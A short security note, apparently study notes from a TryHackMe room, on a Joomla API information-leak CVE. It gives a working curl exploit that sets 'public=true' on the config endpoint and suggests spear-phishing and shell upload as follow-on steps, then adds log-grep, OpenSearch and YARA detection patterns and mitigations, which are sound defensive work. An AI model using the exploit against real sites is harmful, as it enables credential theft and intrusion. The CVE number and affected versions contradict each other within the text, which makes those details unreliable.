# CVE-2023-23572


[[Joomla]] is open-source Content Management System (CMS) and CVE-2023-23572 allowed unauthorized users to fetch information from various web endpoints without prior authentication and can lead to RCE.

Modifying the GET variable `public` value from `false` to `true` on API endpoints ([[API-Hacking]]). [THM Joomify Room](https://tryhackme.com/r/room/joomify) states: *"The API calls are not usually enabled for the general public"*, so why is there variable in production. For the vulnerable version [4.1.0 Joomla Download link](https://downloads.joomla.org/cms/joomla4/4-1-0)

Exploit, consider using [[JQ]] for parsing
```bash
# Never trust inferencing from software... localhost != 127.0.0.1
curl -v -X GET https://$joomla.$vuln/api/$urlthatallowforpublicparametre?public=true

# For customisation consider fuzzing
/api/index.php/v1/config/application?public=true
```
[docs.joomla.org - Joomla Core APIs](https://docs.joomla.org/J4.x:Joomla_Core_APIs)

It is an information leak vulnerability; consider:
- Other services like databases
- Password re-use from admin panel
- [[Spear-Phishing]] with private information
- Connecting to the database and uploading the shell leads to `remote code execution`

This exploit may be very weird...
![1920](exploitisweird-cve-2023-23572.png)
#### Protection and Mitigation

Logs containing `?public=true`,
`tail /var/log/apache2/access.log | grep '?public=true'`
OpenSearch query
`method:GET AND path:("*public=true*") AND path:"*api/index.php*"`

[[Yara]] rule with `yara -r -m CVE-2023-23752.yar /var/log/apache2/`
```yaml
rule CVE_2023_23752_Detection
{
    meta:
        description = "Rule to detect CVE-2023-23752 exploitation attempt"
        author = "Joomify"

    strings:
       $http_method = "GET"
        $api = "api/index.php" nocase
        $http_uri = {70 75 62 6C 69 63 3D 74 72 75 65}  // public=true
    condition:
        all of them
}
```

Mitigation:
- Update the Joomla version. Make sure the Joomla version is not 4.0.0 through 4.0.7.
- Update the alerts in the detection tools so they are notified as soon as an exploitation attempt is made.
- Add a reverse proxy or a WAF in front of the Joomla website and block requests to the API endpoint that tries to change the public.

## References

[THM Joomify Room](https://tryhackme.com/r/room/joomify) 
[4.1.0 Joomla Download link](https://downloads.joomla.org/cms/joomla4/4-1-0)
[docs.joomla.org - Joomla Core APIs](https://docs.joomla.org/J4.x:Joomla_Core_APIs)